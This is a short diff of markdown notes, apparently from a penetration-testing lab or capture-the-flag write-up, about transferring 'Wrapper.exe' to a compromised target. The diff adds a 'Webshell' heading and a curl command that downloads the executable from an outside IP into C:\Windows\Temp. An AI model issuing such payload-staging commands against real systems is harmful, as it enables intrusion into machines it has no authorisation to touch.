@@ -93,7 +93,11 @@ Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bi
 ---
 ## cURL
 
-C:\xampp\htdocs\resources\uploads>`curl http://10.50.85.33/Wrapper.exe -o C:\\Windows\\Temp\\Wrapper.exe`
+#Webshell 
+
+Download Wrapper.exe file.
+
+`curl http://10.50.85.33/Wrapper.exe -o C:\\Windows\\Temp\\Wrapper.exe`
 
 
 ## Impacket
